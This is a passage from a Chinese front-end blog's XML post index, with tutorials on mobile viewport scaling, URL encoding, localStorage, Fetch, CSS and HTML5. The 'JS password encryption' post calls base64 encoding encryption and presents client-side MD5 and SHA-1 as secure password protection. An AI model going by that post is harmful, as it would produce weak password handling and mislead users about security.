    <content type="text"><![CDATA[&emsp;&emsp;研究移动端页面已经有许久了，一直执着于rem来开发，不谈性能怎么样，单从工作效率上看影响了不少，首先要固定设计稿的宽度，一般都是固定在640px，然后在根据根目录的字体大小来计算出每个元素的rem的值，无疑在开发中切图，每个元素都要去计算一边，是不是感觉很麻烦，有没有一种方法，像切PC端页面一样，切了直接写css，不用去计算这么麻烦，答案是肯定有的！好吧，先给大家看一下，我以前用rem来开发的技术文章吧(由于之前博客的迁移，博客地址已经改变，请自行去搜索栏进行搜索相应的文章)！rem相关资料文档：[手机端页面rem自适应脚本][CSS中常用的字体单位：px、em、rem和%的区别][使用rem布局手机页面（自适应各种分辨率手机）][用rem做响应式开发][详解移动端rem变革][使用rem设置文字大小]&emsp;&emsp;好了，废话不多说，进入今天的正题，轻松使用px开发移动端页面！就在前天浏览微信的“天天酷跑”的活动主题的时，发现他全部是采用的px的单位，于是便仔细看了他的核心js代码，猛然一看，恍然大悟！天天酷跑活动页面地址：http://iwan.qq.com/act/kp3dxz/index.htm?&amp;ptag=4_4.5.5.10729_wxf#&emsp;&emsp;上面的具体代码大家可以前往自行研究，下面我把关键性的代码拷贝出来，一看就懂，以后大家只需要直接引入这些js代码就ok了，就不管他设计稿是640、720、750了，直接拿过来直接切，然后修改参数就大功告成了，就完全可以当pc端页面来切了，并且还适应pc端和移动端，万事大吉啊！关键是还适配各个手机，各个分辨率，不用它感觉很浪费，用了它又感觉虚伪地牛逼着，其实也就几行代码的事情，一看就懂只是你没有去深入的往这方面研究罢了！meta默认设置（其他的meta就根据项目需求定）：1&lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"&gt;CSS代码：12.wrap&#123;width:320px;margin:0 auto;&#125;//width：320px，可以根据当前设计稿来定，可以是640、750等尺寸下面一段js代码放入网页头部,例如：设计稿尺寸是640只需要把320全部改成640就ok了：12345678910111213(function()&#123; var width = 750, pw = parseInt(window.screen.width), scale = pw / width, ua = navigator.userAgent; if(/Android (\d+\.\d+)/.test(ua))&#123; var version = parseFloat(RegExp.$1); if(version &gt; 2.3)&#123; document.write('&lt;meta name="viewport" content="width=' + width + ',minimum-scale=' + scale + ',maximum-scale=' + scale + ',target-densitydpi=device-dpi" /&gt;'); &#125;else&#123; document.write('&lt;meta name="viewport" content="width=' + width + ',target-densitydpi=device-dpi" /&gt;'); &#125; &#125;else&#123; document.write('&lt;meta name="viewport" content="width=' + width + ',user-scalable=no,target-densitydpi=device-dpi" /&gt;'); &#125;&#125;)();&emsp;&emsp;为兼容性考虑，在页面下面加入下面js，其中wrap为包裹结构最外层的ID，wrap给它320的宽度居中就ok了：12345if(navigator.appVersion.indexOf('Android') != -1)&#123; document.addEventListener('DOMContentLoaded', function(e)&#123; document.getElementById('main').style.zoom = e.target.activeElement.clientWidth / 750; &#125;);&#125;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>px开发移动端页面</tag>
        <tag>轻松使用px为单位开发移动端页面</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js中encodeURI和decodeURI介绍(解决Url中传递中文参数乱码)]]></title>
    <url>%2F2016%2F01%2F28%2Fjs%E4%B8%ADencodeuri%E5%92%8Cdecodeuri%E4%BB%8B%E7%BB%8D%E8%A7%A3%E5%86%B3url%E4%B8%AD%E4%BC%A0%E9%80%92%E4%B8%AD%E6%96%87%E5%8F%82%E6%95%B0%E4%B9%B1%E7%A0%81%2F</url>
    <content type="text"><![CDATA[一、基本概念encodeURI和decodeURI是成对来使用的，因为浏览器的地址栏有中文字符的话，可以会出现不可预期的错误，所以可以encodeURI把非英文字符转化为英文编码，decodeURI可以用来把字符还原回来。encodeURI方法不会对下列字符进行编码：”:”、”/“、”;” 和 “?”，encodeURIComponent方法可以对这些字符进行编码。decodeURI()方法相当于java.net.URLDecoder.decode(URIString, “UTF-8”);encodeURI()方法相当于java.net.URLEncoder.encode(URIString, “UTF-8”);二、例子1234567&lt;script type="text/javascript"&gt;var uriStr = "http://www.baidu.com?name=张三&amp;amp;num=001 zs";var uriec = encodeURI(encodeURI(uriStr));//注意：一般都是采取双重编码，否则有时会失效document.write("编码后的" + uriec);var uridc = decodeURI(uriec);document.write("解码后的" + uridc);&lt;/script&gt;编码后的http://www.baidu.com?name=%E5%BC%A0%E4%B8%89&amp;num=001%20zs解码后的http://www.baidu.com?name=张三&amp;num=001 zs三：Js的Url中传递中文参数乱码问题，重点：encodeURI编码，decodeURI解码：1.传参页面Javascript代码：123456&lt;script type=”text/javascript”&gt;function send()&#123;var url = "test01.html";var userName = $("#userName").html();window.open(encodeURI(encodeURI(url + "?userName=" + userName))); &#125;&lt;/script&gt;2. 接收参数页面：test02.html12345&lt;script&gt;var urlinfo = window.location.href;//获取urlvar userName = urlinfo.split(“?”)[1].split(“=”)[1];//拆分url得到”=”后面的参数$(“#userName”).html(decodeURI(userName));&lt;/script&gt;四：如何获取Url“？”后，“=”的参数值：A.首先用window.location.href获取到全部url值。B.用split截取“?”后的全部C.split(“?”)后面的[1]内数字，默认从0开始计算五：Js中escape，unescape，encodeURI，encodeURIComponent区别：1.传递参数时候使用，encodeURIComponent否则url中很容易被”#”，”？”，”&amp;”等敏感符号隔断。2.url跳转时候使用，编码用encodeURI，解码用decodeURI。3.escape() 只是为0-255以外 ASCII字符 做转换工作，转换成的 %u** 这样的码，如果要用更多的字符如 UTF-8字符库 就一定要用 encodeURIComponent() 或 encodeURI() 转换才可以成 %nn%nn 这的码才可以,其它情况下escape，encodeURI，encodeURIComponent编码结果相同,所以为了全球的统一化进程，在用 encodeURIComponent() 或 encodeURI() 代替 escape() 使用吧！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>decodeURI</tag>
        <tag>encodeURI</tag>
        <tag>js url传递中文参数乱码</tag>
        <tag>url 参数乱码</tag>
        <tag>url传参乱码</tag>
        <tag>url传递中文参数乱码</tag>
        <tag>url传递参数乱码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过身份证号码获取人的年龄和性别]]></title>
    <url>%2F2016%2F01%2F22%2F%E9%80%9A%E8%BF%87%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E8%8E%B7%E5%8F%96%E4%BA%BA%E7%9A%84%E5%B9%B4%E9%BE%84%E5%92%8C%E6%80%A7%E5%88%AB%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;通过身份证号码获取人的年龄和性别:身份证可以识别一个人的信息，下面就介绍一下如何利用js通过身份证号码获取当事人的年龄和性别。代码实例如下:12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta name="author" content="http://www.softwhy.com/" /&gt;&lt;title&gt;GryCheng前端博客&lt;/title&gt;&lt;script type="text/javascript"&gt; function discriCard(UUserCard)&#123; UUserCard.substring(6,10)+"-"+UUserCard.substring(10,12)+"-"+UUserCard.substring(12,14); //获取性别 if(parseInt(UUserCard.substr(16,1))%2==1) &#123; alert("男"); //是男则执行代码 ... &#125; else &#123; alert("女"); //是女则执行代码 ... &#125; //获取年龄 var myDate = new Date(); var month = myDate.getMonth() + 1; var day = myDate.getDate(); var age = myDate.getFullYear()-UUserCard.substring(6, 10) - 1; if (UUserCard.substring(10,12)&lt;month||UUserCard.substring(10,12)==month&amp;amp;&amp;amp;UUserCard.substring(12,14)&lt;=day) &#123; age++; &#125; alert(age); //年龄 age &#125; window.onload=function()&#123; var txt=document.getElementById("txt"); var bt=document.getElementById("bt"); bt.onclick=function()&#123;discriCard(txt.value);&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="text" id="txt" /&gt;&lt;input type="button" value="点击获取信息" id="bt" /&gt;&lt;/body&gt;&lt;/html&gt;&emsp;&emsp;以上代码实现了我们的要求，在文本框内输入身份证号码，然后点击按钮就会弹出年龄和性别。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>通过身份证号码获取人的年龄</tag>
        <tag>通过身份证号码获取人的性别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS中实现密码加密]]></title>
    <url>%2F2016%2F01%2F17%2Fjs%E4%B8%AD%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[1、base64加密在页面中引入base64.js文件，调用方法为：12345678910111213141516171819&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;base64加密&lt;/title&gt;&lt;script type="text/javascript" src="base64.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var b = new Base64();var str = b.encode("admin:admin");alert("base64 encode:" + str);//解密str = b.decode(str);alert("base64 decode:" + str);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;2、md5加密在页面中引用md5.js文件，调用方法为:123456789101112131415&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;md5加密&lt;/title&gt;&lt;script type="text/ecmascript" src="md5.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var hash = hex_md5("123dafd");alert(hash)&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;3、sha1加密据说这是最安全的加密页面中引入sha1.js，调用方法为123456789101112131415&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;sha1加密&lt;/title&gt;&lt;script type="text/ecmascript" src="sha1.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var sha = hex_sha1('mima123465')alert(sha)&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;各js文件下载地址：base64.jsmd5.jssha1.js]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js md5</tag>
        <tag>JS中实现密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS定义input disabled样式]]></title>
    <url>%2F2016%2F01%2F14%2Fcss%E5%AE%9A%E4%B9%89input-disabled%E6%A0%B7%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[disabled 属性规定应该禁用 input 元素。被禁用的 input 元素既不可用，也不可点击。可以设置 disabled 属性，直到满足某些其他的条件为止（比如选择了一个复选框等等）。然后，就需要通过 JavaScript 来删除 disabled 值，将 input 元素的值切换为可用。以下三种写法都可以禁用 input123&lt;p&gt;&lt;inputtype="text"disabledvalue="已禁用"/&gt;&lt;/p&gt;&lt;p&gt;&lt;inputtype="text"disabled="disabled"value="已禁用"/&gt;&lt;/p&gt;&lt;p&gt;&lt;inputtype="text"disabled=disabledvalue="已禁用"/&gt;&lt;/p&gt;被禁用的 input 默认显示灰色，可以通过CSS修改样式。1. 利用CSS3 :disabled 伪元素定义123456//Chrome Firefox Opera Safariinput:disabled&#123;border:1px solid #DDD;background-color:#F5F5F5;color:#ACA899;&#125;2. 利用属性选择符定义123456//IE6 failedinput[disabled]&#123;border:1px solid #DDD;background-color:#F5F5F5;color:#ACA899;&#125;3. 利用类来定义12345input.disabled&#123;border:1px solid #DDD;background-color:#F5F5F5;color:#ACA899;&#125;最终结果：1234567891011input[disabled],input:disabled&#123;border:1px solid #DDD;background-color:#F5F5F5;color:#ACA899;&#125;//IE6 Using Javascript to add CSS class "disabled"* html input.disabled&#123;border:1px solid #DDD;background-color:#F5F5F5;color:#ACA899;&#125;注意：IE8 bug 由于IE8 不识别 :disabled 导致input[disabled],input:disabled样式失效，可以考虑单独来写，或者直接使用input[disabled]。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CSS定义input disabled样式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[封装HTML5中localStorage（本地存储）]]></title>
    <url>%2F2016%2F01%2F12%2F%E5%B0%81%E8%A3%85html5%E4%B8%ADlocalstorage%EF%BC%88%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;localStorage，俗名本地存储，是一个只有5M大小的浏览器端存储工具，不过相比cookie的几K存储量来说，存储空间还算是提升了不少，这个东东在哪里看呢(⊙o⊙)?打开浏览器—&gt;F12—&gt;直接上图吧！上图：看吧，不是个很复杂的东西，很直观嘛，下面教大家如何使用，第一步算了，知道你们都是懒虫，我直接封装好了，copy吧：1234567891011121314151617181920212223242526/*设置与获取Cookie*/var Cookie =&#123;&#125;Cookie.write = function(key, value, duration)&#123; var d = new Date(); d.setTime(d.getTime()+1000*60*60*24*30); document.cookie = key + "=" + encodeURI(value) + "; expires=" + d.toGMTString();&#125;;Cookie.read = function(key)&#123; var arr = document.cookie.match(new RegExp("(^| )"+key+"=([^;]*)(;|$)")); if(arr != null) return decodeURIComponent(arr[2]); return "";&#125;;//定义本地存储对象var storage = &#123; getItem:function(key)&#123;//假如浏览器支持本地存储则从localStorage里getItem，否则乖乖用Cookie return window.localStorage? localStorage.getItem(key): Cookie.read(key); &#125;, setItem:function(key,val)&#123;//假如浏览器支持本地存储则调用localStorage，否则乖乖用Cookie if (window.localStorage) &#123; localStorage.setItem(key,val); &#125; else &#123; Cookie.write(key,val); &#125; &#125; &#125;;&emsp;&emsp;封装的比较简单，如果有更多需要可以自己再扩张一下，使用的话是蛮简单的，举例：12345storage.setItem("UserName","侠名风大帅哥");//将UserName存进去if(storage.getItem("UserName"))//假如存进去了&#123; console.log(storage.getItem("UserName"));//打印出来样子&#125;注意事项：&emsp;&emsp;因为localStorage存储进去的都是string类型，所以如果要存json记得存前读后做些处理123var myJson=&#123;"UserName","侠名风大帅哥"&#125;;storage.setItem("MyJson",JSON.stringify(myJson));//将myJson存进去，记得JSON.stringify转成字符串var getmyJson=JSON.parse(storage.getItem("MyJson"));//取出来的是字符串，记得JSON.parse还原一下结尾：&emsp;&emsp;是不是觉得玩转localStorage如此轻松了，将来什么性能优化，减少与服务器的请求，用户历史行为记录等都可以通过它来完成，就看你能想到多少灵感了]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>localStorage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最新纯js移动端日期选择插件（转载）]]></title>
    <url>%2F2016%2F01%2F12%2F%E6%9C%80%E6%96%B0%E7%BA%AFjs%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%97%A5%E6%9C%9F%E9%80%89%E6%8B%A9%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[最近在项目上需要使用日期选择插件，由于是移动端的项目，对请求资源还是蛮节约的，可是百度上一搜，诶~全是基于jquery、zepto的，本来类库就很大，特别像mobiscroll这种样式文件一大堆又丑又长还收费，我就忍不住自己做了一个，也不过就10几kb的事情嘛，想想独乐乐不如众乐乐，如果伙伴们手上没有轻量级的日期选择插件不如先拿我这个应付一下吧！项目截图：手机预览：查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>纯js移动端日期选择插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我们的web前端变的越来越复杂]]></title>
    <url>%2F2016%2F01%2F11%2F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%AC%E7%9A%84web%E5%89%8D%E7%AB%AF%E5%8F%98%E7%9A%84%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%A4%8D%E6%9D%82%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;前端发展了也有些年头了，曾记得很多年前，聊起前端，都觉得是很简单，那个时候都没有前端工程师这个职位。可现在，前端已经逆袭了，已经不是原来的样子了,各种技术层出不穷，显的越来越高深莫测了。前端真的变得那么难了吗？在我看来，前端还是原来的前端，虽然有些关变换，但不应该像现在一样复杂。框架太多了,新技术太多了&emsp;&emsp;我们总是迷失在各种技术了，总是迷失在新技术带了的各种概念里。angular rect bootstrap 等等，他们给我们带来便利的同时也给我们带来了麻烦。我们真的需要这些框架吗？学会了这些框架就等于学会了前端吗？&emsp;&emsp;或许很多时候我们学习这些不是为了去解决问题，是为了显示我们是多么的有格调，我们掌握了多少流行的东西，更或者是用来粉饰我们的简历。我们已经远离的技术的真正价值。记得几个月前和一个前端在讨论，他问我现在有哪些流行的技术；我说，我把手机上的1px的线能显示一个像素就是流行技术了(手机端一个像素的线会大于一个像素)。&emsp;&emsp;这些新技术虽然带给我们方便，但我们不能迷失在里面，我们要去解决问题；再有一个例子，css3的动画有BUG，但是我在网上很少见人去讨论这些问题，讨论多就是各种框架的使用。我们不能迷失在各种新技术里，主要我们就会把简单的问题度复杂化了，会把我们的前端变的很复杂。我们还在抱着过时的准则当圣经&emsp;&emsp;曾几时雅虎的前端优化准则成为了标准。但是几年过去了，那些准则还在束缚着现在的人们。&emsp;&emsp;比如在移动端 大家习惯用zepto，我这里不是喷这个zepto。因为现在网速快了，加载个jquery已经感觉不除开比加载zepto慢了，但是很多人还是在用这个zepto，zepto有很多bug，远没有jquery成熟。网上说的性能，至少我测试的时候没发现jquery性能赶不上他。我不知道哪些说jquery性能不好的人有没有测试比对过。&emsp;&emsp;再举个例子，前端js css发布前压缩的问题。以前压缩也是因为网速慢，现在除了核心的压缩以外，一般的我觉得根本没必要压缩了，压缩了调试还麻烦，还有一堆配置，增加项目复杂度，压缩真的有必有吗？&emsp;&emsp;关于模块化开发，模块化开发也是抄的沸沸扬扬，貌似是必备的技能，但是我们有多少项目需要模块化开发，他们给我们带来多少便利？至少我做过的项目大多数是用不倒模块化开发的。我们的代码变得怪异难懂&emsp;&emsp;我不知道从什么时候，前端的代码写的越难懂就越能显示水平。代码是要尽量保持可读性的。能用通俗的写法写的，尽量不用怪异的写法写，哪怕我要多写几行代码，我们也要保持代码的可读性。但是现在的前端代码以别人看不懂为荣，以用了某些高级应用为荣，前端的代码编写已经进入了误区。有时候我发现身边的一些人，代码那些怪异的写法，他自己根本也不知道为什么那么写，只是单纯的觉得那样写看起来水平高而已，仅仅如此而已。我们这些老前端没给新手一个明确，切实的指引&emsp;&emsp;JavaScript的原型继承算是比较重要的，但是我读了很多JavaScript的书，没有发现那本书真正把他讲清楚了，至少现在没发现。那么多书，讲了那么多时髦的东西，我们却没讲出这个最基础的概念。再比如说，书上讲的的很多css3的东西都是W3C的文档改编的，网上的。我不知道大家再用css3的时候有没有发现很多的bug，这些bug难倒不需要写在书里让我们的新人少走一些弯路吗？&emsp;&emsp;我们都教给新手很多时髦东西，让他们在这些时髦的东西里迷失，却没人把最重要的教给他们，不是我们的失职吗？]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>web前端变的越来越复杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fetch：下一代 Ajax 技术]]></title>
    <url>%2F2016%2F01%2F09%2Ffetch%EF%BC%9A%E4%B8%8B%E4%B8%80%E4%BB%A3-ajax-%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Ajax，2005年诞生的技术，至今已持续了 10 年。它是一种在客户端创建一个异步请求的技术，本质上它不算创新，是一组技术的组合。它的核心对象是 XMLHttpRequest。简单回顾下历史1996年，IE 中首先添加了 iframe 用来实现异步请求获取服务器内容1998年，微软 Outlook 在客户端 script 中实现了 XMLHttp 对象1999年，微软在 IE5 中添加了 XMLHTTP ActiveX 对象用来异步获取服务器内容，该对象直到 Edge 浏览器才废弃。其它浏览器陆续实现了类似的对象称为 XMLHttpReques。2004年，Google Gmail 中大量使用 XMLHttpRequest2005年，Google Map 中大量使用 XMLHttpRequest2005年，Jesse James Garrett 发表了文章 “ Ajax: A New Approach to Web Applications “，Ajax 诞生2006年，XMLHttpRequest 被 W3C 采纳，最后更新时间是 2014年1月使用步骤大概如下123456789var xhr = new XMLHttpRequest();xhr.open('GET', url);xhr.onload = function() &#123; // To do with xhr.response&#125;;xhr.onerror = function() &#123; // Handling errors&#125;;xhr.send();以上可以看出，XHR 使用 onXXX 处理，典型的 “事件模式”。Fetch目前还不是 W3C 规范，由 whatag 负责出品。与 Ajax 不同的是，它的 API 不是事件机制，而采用了目前流行的 Promise 方式处理。我们知道 Promise 是已经正式发布的 ES6 的内容之一。123456789fetch('doAct.action').then(function(res) &#123; if (res.ok) &#123; res.text().then(function(obj) &#123; // Get the plain text &#125;) &#125;&#125;, function(ex) &#123; console.log(ex)&#125;)以上fetch 函数是全局的，目前最新的Firefox，Chrome，Opera 都已支持，详见以上是一个最简单的请求，只要传一个参数 url 过去，默认为 get 请求，获取纯文本，fetch第二个参数可以进行很多配置，比如 POST 请求123456789101112131415fetch("doAct.action", &#123; method: "POST", headers: &#123; "Content-Type": "application/x-www-form-urlencoded" &#125;, body: "keyword=荣耀7i&amp;amp;enc=utf-8&amp;amp;pvid=0v3w1kii.bf1ela"&#125;).then(function(res) &#123; if (res.ok) &#123; // To do with res &#125; else if (res.status == 401) &#123; // To do with res &#125;&#125;, function(e) &#123; // Handling errors&#125;);如果返回的是 JSON， 如下123456789fetch('doAct.action').then(function(res) &#123; if (res.ok) &#123; res.json().then(function(obj) &#123; // Get the JSON &#125;) &#125;&#125;, function(ex) &#123; console.log(ex)&#125;)res 实际上该规范定义的 Response 对象，它有如下方法arrayBuffer()blob()json()text()formData()]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>fetch</tag>
        <tag>Fetch：下一代 Ajax 技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用HTML5的十大原因]]></title>
    <url>%2F2016%2F01%2F09%2F%E4%BD%BF%E7%94%A8html5%E7%9A%84%E5%8D%81%E5%A4%A7%E5%8E%9F%E5%9B%A0%2F</url>
    <content type="text"><![CDATA[你难道还没有考虑使用 html5？&emsp;&emsp;当然我猜想你可能有自己的原因：它现在还没有被广泛的支持，在 ie 中不好使，或者你就是喜欢写比较严格的 xhtml 代码。html5 是 web 开发世界的一次重大的改变，事实上不管你是否喜欢，它都是代表着未来趋势。其实 html5 并不难理解和使用。我们这里能列出许多原因为什么现在要开始使用 html5。&emsp;&emsp;目前有很多的文章介绍使用 html5 并且介绍了使用它的优势和好处，没错，这篇文章也类似。随着更多这样的文章，以及 apple 的支持，adobe 围绕 html5 的产品开发，以及移动 flash 的死亡，如此多网站的支持，我想对那些仍旧没有或者不想接受它的人说一些话。我认为主要得原因是，它看起来像一个神秘的东西。很多感觉它像喷气背包或者飞行汽车。一个未经验证的非凡想法但是并不实际。但是事实上现在已近非常的实际了。&emsp;&emsp;为了解密 html5 并且帮助顽固的开发设计人员，我这里写了列出了使用 html5 的几大原因，希望对大家有帮助！第一大原因： 它是未来，开始用吧！&emsp;&emsp;最大的原因今天你就开始使用 html5 是因为它是未来，不要掉队了！html5 不会往每个方向发展，但是更多的元素已经被很多公司采用，并且开始着手开发。html5 其实更像 html，它不是一个新的技术需要你重新学习！如果你开发 xhtml strict 的话你现在就已经在开发 html5 了。为什么不更完整的享受 html5 的功能呢？&emsp;&emsp;你实际上没有任何借口不接受 html5。事实上我唯一一个原因使用 html5 是因为它书写代码简单清晰。其它的特性其实我也没有真正使用。你可以考虑现在开始使用 html5 书写代码，它能帮助你改变书写代码的方式及其设计方式。开始用 html5 代码编写 web 应用吧，说不定下一个移动应用或者游戏应用就是用 html5 开发的！第二大原因： 移动，移动还是移动&emsp;&emsp;你可以称之为“直觉”，但是我认为移动技术将会变得更加的流行。我知道，这里有些非常疯狂的猜测，有些可能你也想到了 – mobile 是一个时尚！移动设备将占领世界。更多的接受移动设备将会增长的非常迅速，这意味着更多的用户会选择使用移动设备访问网站或者 web 应用。html5 是最移动化的开发工具。随着 adobe 宣布放弃移动 flash 开发，你将会考虑使用 html5 来开发 webapp 应用。&emsp;&emsp;当手机浏览器完全支持 html5 那么开发移动项目将会和设计更小的触摸显示一样简单。这里有很多的meta标签允许你优化移动：&emsp;&emsp;viewport：允许你定义viewport宽度和缩放设置；全屏浏览器：ios 指定的数值允许 apple 设备全屏模式显示；Home screen icons：就像桌面收藏，这些图标可以用来添加收藏到 ios 和 android 移动设备的首页。第三大原因： 遗留及其跨浏览器支持&emsp;&emsp;你的现代流行浏览器都支持 html5（chrome，firefox，safari，ie9 和 opera），并且创建了 html5 doctype 这样所有的浏览器，即使非常老非常令人厌恶浏览器像 ie6 都可以使用。但是因为老的浏览器能够识别 doctype 并不意味它可以处理 html5 标签和功能。幸运的是，html5 已经使得开发更加简单了，支持更多浏览器，这样老的 ie 浏览器可以通过添加 js 代码来使用新的元素：123&lt;!--[if lt IE 9]&gt;&lt;script src="html5shiv.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;具体内容 点此了解详情 。第四大原因：游戏开发&emsp;&emsp;没错， 你可以使用 html5 的canvas开发游戏。html5 提供了一个非常伟大的，移动友好的方式去开发有趣互动的游戏。如果你开发 flash 游戏，你就会喜欢上 html5 的游戏开发。第五大原因：更好的互动&emsp;&emsp;我们都喜欢更好的互动，我们都喜欢对于用户有反馈的动态网站，用户可以享受互动的过程。输入canvas，html5 的画图标签允许你做更多的互动和动画，就像我们使用 flash 达到的效果。&emsp;&emsp;除了canvas，html5 同样也拥有很多 api 允许你创建更加好的用户体验并且更加动态的 web 应用程序。这里有一个列表：Drag and Drop (DnD)Offline storage databaseBrowser history managementdocument editingTimed media playback第六大原因：更聪明的存储&emsp;&emsp;html5 中最酷的特性就是本地存储。有一点像比较老的技术 cookie 和客户端数据库的融合。它比 cookie 更好用因为支持多个 windows 存储，它拥有更好的安全和性能，即使浏览器关闭后也可以保存。&emsp;&emsp;因为它是个客户端的数据库，你不用担心用户删除任何 cookie，并且所有主流浏览器都支持。&emsp;&emsp;本地存储对于很多情况来说都不错，它是 html5 工具中一个不需要第三方插件实现的。能够保存数据到用户的浏览器中意味你可以简单的创建一些应用特性例如：保存用户信息，缓存数据，加载用户上一次的应用状态。更多关于本地存储 请点此了解 。第七大原因：更清晰的代码&emsp;&emsp;如果你对于简单，优雅，容易阅读的代码有所偏好的话，html5 绝对是一个为你量身定做的东西。html5 允许你写出简单清晰富于描述的代码。符合语义学的代码允许你分开样式和内容。看看这个典型的简单拥有导航的 header 代码：12345678910&lt;div id="header"&gt;&lt;h1&gt;Header Text&lt;/h1&gt;&lt;div id="nav"&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="#"&gt;Link&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="#"&gt;Link&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="#"&gt;Link&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;是不是很简单？但是使用 html5 后会使得代码更加简单并且富有含义：12345678910&lt;header&gt;&lt;h1&gt;Header Text&lt;/h1&gt;&lt;nav&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="#"&gt;Link&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="#"&gt;Link&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="#"&gt;Link&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/nav&gt;&lt;/header&gt;&emsp;&emsp;使用 html5 你可以通过使用语义行的header标签描述内容来最后解决你的div及class定义问题。以前你需要大量的使用div来定义每一个页面内容区域，但是使用新的section，article，header，footer，aside和nav标签，需要你让你的代码更加清晰易于阅读。第八大原因：doctypehtml>```1234567891011121314&amp;emsp;&amp;emsp;没错，就是doctype，没有更多内容了。是不是非常简单？不需要拷贝粘贴一堆无法理解的代码，也没有多余的head标签。最大的好消息在于，除了简单，它能在每一个浏览器中正常工作即使是名声狼藉的 ie6。### 第九大原因：视频和音频支持&amp;emsp;&amp;emsp;忘了 flash 和其它第三方应用吧，让你的视频和音频通过 html5 标签video和audio来访问资源。正确播放媒体一直都是一个非常可怕的事情，你需要使用embed和object标签，并且为了它们能正确播放必须赋予一大堆的参数。你的媒体标签将会非常复杂，大堆得令人迷惑的代码。而 html5 视频和音频标签基本将他们视为图片：```&lt;video src=&quot;&quot;/&gt;```。但是其它参数例如宽度和高度或者自动播放呢？不必担心，只需要像其它 html 标签一样定义：```&lt;video src=&quot;url&quot; width=&quot;640px&quot; height=&quot;380px&quot; autoplay/&gt;```。&amp;emsp;&amp;emsp;实际上这个过程非常简单，然而我们的老浏览器可能并不喜欢我们的 html5，你需要添加更多代码来让他们正确工作。但是这个代码还是比embed和object来的简单的多。```html&lt;video poster=&quot;myvideo.jpg&quot; controls&gt;&lt;source src=&quot;myvideo.m4v&quot; type=&quot;video/mp4&quot; /&gt;&lt;source src=&quot;myvideo.ogg&quot; type=&quot;video/ogg&quot; /&gt;&lt;embed src=&quot;/to/my/video/player&quot;&gt;&lt;/embed&gt;&lt;/video&gt;第十大原因：易用性&emsp;&emsp;两个原因使得使用 html5 创建网站更加简单：语义性和 aria。新的 html 标签像header，footer，nav，section，aside等等，使得阅读者更加容易去访问内容。在以前即使你定义了class或者id你的阅读者也没有办法去了解给出的div究竟是什么。使用新的语义学的定义标签，你可以更好的了解 html 文档，并且创建一个更好的使用体验。&emsp;&emsp;aria 是一个 w3c 的标准主要用来对 html 文章中的元素指定“角色”，通过角色属性来创建重要的页面地形例如header，footer，navigation或者aritcle很有必要。这一点曾经被忽略掉了并且没有被广泛使用，因为事实上并不验证。然而 html5 将会验证这样属性。同时，html5 将会内建这些角色并且无法不覆盖。更多的 html5 和 aria 讨论，请大家查看这里。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>html5优势</tag>
        <tag>html5好处</tag>
        <tag>使用HTML5的十大原因</tag>
